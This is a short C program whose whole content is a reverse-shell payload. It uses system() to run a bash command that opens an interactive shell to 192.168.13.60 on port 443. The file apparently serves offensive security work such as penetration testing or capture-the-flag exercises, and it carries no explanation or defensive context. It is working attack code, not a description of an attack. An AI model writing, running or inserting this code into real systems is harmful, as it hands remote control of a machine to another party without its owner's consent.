#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){

	char command[150];

	strcpy(command, "bash -c 'bash -i >& /dev/tcp/192.168.13.60/443 0>&1'");
	system(command);

	return(0);
}
